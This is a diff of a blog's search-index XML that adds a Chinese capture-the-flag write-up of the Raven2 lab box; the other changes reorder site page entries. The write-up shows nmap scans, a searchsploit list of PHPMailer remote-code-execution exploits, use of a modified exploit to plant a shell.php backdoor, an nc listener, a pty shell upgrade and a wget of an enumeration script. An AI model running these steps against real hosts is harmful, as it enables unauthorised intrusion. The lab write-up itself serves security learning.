@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>raven2靶场</title>
+      <link href="/2024/06/27/2024%E5%B9%B46%E6%9C%8827%E6%97%A5-raven2/"/>
+      <url>/2024/06/27/2024%E5%B9%B46%E6%9C%8827%E6%97%A5-raven2/</url>
+      
+        <content type="html"><![CDATA[<h1 id="raven2靶场"><a href="#raven2靶场" class="headerlink" title="raven2靶场"></a>raven2靶场</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ ifconfig                    </span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.159.129  netmask 255.255.255.0  broadcast 192.168.159.255</span><br><span class="line">        inet6 fe80::20c:29ff:fe4d:c7ff  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:4d:c7:ff  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 5665  bytes 556139 (543.1 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 7213  bytes 2015885 (1.9 MiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 8  bytes 480 (480.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 8  bytes 480 (480.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">                                                                                             </span><br><span class="line">                                                                                              </span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nmap -sS  192.168.159.0/24 </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-27 21:26 CST</span><br><span class="line">Nmap scan report for 192.168.159.1</span><br><span class="line">Host is up (0.00037s latency).</span><br><span class="line">Not shown: 997 filtered tcp ports (no-response)</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">135/tcp open  msrpc</span><br><span class="line">139/tcp open  netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line">MAC Address: 00:50:56:C0:00:08 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.159.2</span><br><span class="line">Host is up (0.000084s latency).</span><br><span class="line">Not shown: 999 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">53/tcp open  domain</span><br><span class="line">MAC Address: 00:50:56:E1:64:0A (VMware)</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.159.132</span><br><span class="line">Host is up (0.00028s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (reset)</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">22/tcp  open  ssh</span><br><span class="line">80/tcp  open  http</span><br><span class="line">111/tcp open  rpcbind</span><br><span class="line">MAC Address: 00:0C:29:57:62:33 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.159.254</span><br><span class="line">Host is up (0.000054s latency).</span><br><span class="line">All 1000 scanned ports on 192.168.159.254 are in ignored states.</span><br><span class="line">Not shown: 1000 filtered tcp ports (no-response)</span><br><span class="line">MAC Address: 00:50:56:FD:C9:B4 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.159.129</span><br><span class="line">Host is up (0.0000040s latency).</span><br><span class="line">Not shown: 999 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line"></span><br><span class="line">Nmap done: 256 IP addresses (5 hosts up) scanned in 12.00 seconds</span><br><span class="line">                                                                                              </span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nmap -sS -p- 192.168.159.132</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-27 21:26 CST</span><br><span class="line">Nmap scan report for 192.168.159.132</span><br><span class="line">Host is up (0.00080s latency).</span><br><span class="line">Not shown: 65531 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http</span><br><span class="line">111/tcp   open  rpcbind</span><br><span class="line">60300/tcp open  unknown</span><br><span class="line">MAC Address: 00:0C:29:57:62:33 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 4.76 seconds</span><br></pre></td></tr></table></figure><p>访问192.168.169.132:80<br>就是一个简答的网站，扫描后台<br><img src="https://pic.imgdb.cn/item/667d701ed9c307b7e9f3f6c0.png" alt=""><br>有一个DS_STORE，还有vender</p><p><img src="https://pic.imgdb.cn/item/667d701ed9c307b7e9f3f58b.png" alt=""></p><p>在vender里面可以看到<br><img src="https://pic.imgdb.cn/item/667d701ed9c307b7e9f3f719.png" alt=""></p><p>逐个去看发现存在PHPMailer<br><img src="https://pic.imgdb.cn/item/667d701ed9c307b7e9f3f633.png" alt=""></p><p>并且在version</p><p>里面提示了版本号5.2.16</p><p>看到还有一个wordpress，访问了一下/wordpress</p><p>勉强能看？</p><p>既然是wordpress，我们就可以用wpscan扫描看看</p><p>没啥东西</p><p>不如试试PHPMailer</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ searchsploit PHPMailer</span><br><span class="line">------------------------------------------------------------ ---------------------------------</span><br><span class="line"> Exploit Title                                              |  Path</span><br><span class="line">------------------------------------------------------------ ---------------------------------</span><br><span class="line">PHPMailer 1.7 - &#x27;Data()&#x27; Remote Denial of Service           | php/dos/25752.txt</span><br><span class="line">PHPMailer &lt; 5.2.18 - Remote Code Execution                  | php/webapps/40968.sh</span><br><span class="line">PHPMailer &lt; 5.2.18 - Remote Code Execution                  | php/webapps/40970.php</span><br><span class="line">PHPMailer &lt; 5.2.18 - Remote Code Execution                  | php/webapps/40974.py</span><br><span class="line">PHPMailer &lt; 5.2.19 - Sendmail Argument Injection (Metasploi | multiple/webapps/41688.rb</span><br><span class="line">PHPMailer &lt; 5.2.20 - Remote Code Execution                  | php/webapps/40969.py</span><br><span class="line">PHPMailer &lt; 5.2.20 / SwiftMailer &lt; 5.4.5-DEV / Zend Framewo | php/webapps/40986.py</span><br><span class="line">PHPMailer &lt; 5.2.20 with Exim MTA - Remote Code Execution    | php/webapps/42221.py</span><br><span class="line">PHPMailer &lt; 5.2.21 - Local File Disclosure                  | php/webapps/43056.py</span><br><span class="line">WordPress Plugin PHPMailer 4.6 - Host Header Command Inject | php/remote/42024.rb</span><br><span class="line">------------------------------------------------------------ ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure><p>确实有，而且不少</p><p>下载 php/webapps/40974.py的python文件，并进行修改</p><p><img src="https://pic.imgdb.cn/item/667d8214d9c307b7e91bb5ce.png" alt=""></p><p>其中的意思是在访问/content.php的时候建立一个shell.php的后门文件</p><p>打开地址网站，访问/contact.php，然后监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure><p>进去以后先升级交互shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;;</span><br></pre></td></tr></table></figure><p>使用LinEnum(Linux枚举及权限提升检查工具)<br>直接下载：<br><a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a><br>搭建http服务进行EXP文件传输：<br>python3 -m http.server 8000<br>进行下载：<br>wget <a href="http://192.168.3.2:8000/LinEnum-master/LinEnum.sh">http://192.168.3.2:8000/LinEnum-master/LinEnum.sh</a><br>加执行权限：<br>chmod +x LinEnum.sh<br>执行：<br>(可以查看到Mysql是用root登陆的)<br><img src="https://pic.imgdb.cn/item/667d83a2d9c307b7e91ef6de.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find ./ -name &quot;flag*&quot;</span><br></pre></td></tr></table></figure><p>能看到flag2和3</p><p>然后使用mysql的udf提权<br>后面的看一下大佬的吧，我没弄成，等我明天看看原理再说/ww</p><p><a href="https://www.freebuf.com/articles/web/261047.html">https://www.freebuf.com/articles/web/261047.html</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 靶场 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 靶场 </tag>
+            
+            <tag> raven2 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>nuclei模板编写&amp;&amp;yaml学习</title>
       <link href="/2024/06/27/2024%E5%B9%B46%E6%9C%8827%E6%97%A5-yaml%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/"/>
       <url>/2024/06/27/2024%E5%B9%B46%E6%9C%8827%E6%97%A5-yaml%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/</url>
@@ -939,9 +966,9 @@
     
     
     <entry>
-      <title>关于店长</title>
-      <link href="/about/index.html"/>
-      <url>/about/index.html</url>
+      <title>分类</title>
+      <link href="/categories/index.html"/>
+      <url>/categories/index.html</url>
       
         <content type="html"><![CDATA[]]></content>
       
@@ -972,11 +999,11 @@
     
     
     <entry>
-      <title></title>
-      <link href="/js/runtime.js"/>
-      <url>/js/runtime.js</url>
+      <title>关于店长</title>
+      <link href="/about/index.html"/>
+      <url>/about/index.html</url>
       
-        <content type="html"><![CDATA[var now=new Date;function createtime(){now.setTime(now.getTime()+1e3);var e=new Date("04/10/2023 00:00:00"),t=Math.trunc(234e8+(now-e)/1e3*17),a=(t/1496e5).toFixed(6),o=new Date("04/10/2023 00:00:00"),n=(now-o)/1e3/60/60/24,r=Math.floor(n),i=(now-o)/1e3/60/60-24*r,s=Math.floor(i);1==String(s).length&&(s="0"+s);var d=(now-o)/1e3/60-1440*r-60*s,l=Math.floor(d);1==String(l).length&&(l="0"+l);var g=(now-o)/1e3-86400*r-3600*s-60*l,b=Math.round(g);1==String(b).length&&(b="0"+b);let c="";c=s<18&&s>=9?`<img class='boardsign' src='' title=''><br>  <div style="font-size:13px;font-weight:bold">本店已开张 ${r} 天 ${s} 小时 ${l} 分 ${b} 秒 <i id="heartbeat" class='fas fa-heartbeat'></i> <br> 旅行者 1 号当前距离地球 ${t} 千米，约为 ${a} 个天文单位 🚀</div> </b> <br> <b> <font size = 2px>再看看那个光点，它就在那里，这是家园，这是我们 —— 你所爱的每一个人，你认识的每一个人，你听说过的每一个人，曾经有过的每一个人，都在它上面度过他们的一生✨✨</font></b> `:` <img class='boardsign' src='' title=''><br> <div style="font-size:13px;font-weight:bold">本店已开张 ${r} 天 ${s} 小时 ${l} 分 ${b} 秒 <i id="heartbeat" class='fas fa-heartbeat'></i> <br> 旅行者 1 号当前距离地球 ${t} 千米，约为 ${a} 个天文单位 🚀</div> </b> <br> <b> <font size = 2px>再看看那个光点，它就在那里，这是家园，这是我们 —— 你所爱的每一个人，你认识的每一个人，你听说过的每一个人，曾经有过的每一个人，都在它上面度过他们的一生✨✨</font></b> `,document.getElementById("workboard")&&(document.getElementById("workboard").innerHTML=c)}setInterval((()=>{createtime()}),1e3);]]></content>
+        <content type="html"><![CDATA[]]></content>
       
     </entry>
     
@@ -1027,6 +1054,17 @@
     
     
     <entry>
+      <title>标签</title>
+      <link href="/tags/index.html"/>
+      <url>/tags/index.html</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title></title>
       <link href="/js/universe.js"/>
       <url>/js/universe.js</url>
@@ -1038,22 +1076,11 @@
     
     
     <entry>
-      <title>分类</title>
-      <link href="/categories/index.html"/>
-      <url>/categories/index.html</url>
+      <title></title>
+      <link href="/js/runtime.js"/>
+      <url>/js/runtime.js</url>
       
-        <content type="html"><![CDATA[]]></content>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>标签</title>
-      <link href="/tags/index.html"/>
-      <url>/tags/index.html</url>
-      
-        <content type="html"><![CDATA[]]></content>
+        <content type="html"><![CDATA[var now=new Date;function createtime(){now.setTime(now.getTime()+1e3);var e=new Date("04/10/2023 00:00:00"),t=Math.trunc(234e8+(now-e)/1e3*17),a=(t/1496e5).toFixed(6),o=new Date("04/10/2023 00:00:00"),n=(now-o)/1e3/60/60/24,r=Math.floor(n),i=(now-o)/1e3/60/60-24*r,s=Math.floor(i);1==String(s).length&&(s="0"+s);var d=(now-o)/1e3/60-1440*r-60*s,l=Math.floor(d);1==String(l).length&&(l="0"+l);var g=(now-o)/1e3-86400*r-3600*s-60*l,b=Math.round(g);1==String(b).length&&(b="0"+b);let c="";c=s<18&&s>=9?`<img class='boardsign' src='' title=''><br>  <div style="font-size:13px;font-weight:bold">本店已开张 ${r} 天 ${s} 小时 ${l} 分 ${b} 秒 <i id="heartbeat" class='fas fa-heartbeat'></i> <br> 旅行者 1 号当前距离地球 ${t} 千米，约为 ${a} 个天文单位 🚀</div> </b> <br> <b> <font size = 2px>再看看那个光点，它就在那里，这是家园，这是我们 —— 你所爱的每一个人，你认识的每一个人，你听说过的每一个人，曾经有过的每一个人，都在它上面度过他们的一生✨✨</font></b> `:` <img class='boardsign' src='' title=''><br> <div style="font-size:13px;font-weight:bold">本店已开张 ${r} 天 ${s} 小时 ${l} 分 ${b} 秒 <i id="heartbeat" class='fas fa-heartbeat'></i> <br> 旅行者 1 号当前距离地球 ${t} 千米，约为 ${a} 个天文单位 🚀</div> </b> <br> <b> <font size = 2px>再看看那个光点，它就在那里，这是家园，这是我们 —— 你所爱的每一个人，你认识的每一个人，你听说过的每一个人，曾经有过的每一个人，都在它上面度过他们的一生✨✨</font></b> `,document.getElementById("workboard")&&(document.getElementById("workboard").innerHTML=c)}setInterval((()=>{createtime()}),1e3);]]></content>
       
     </entry>
     
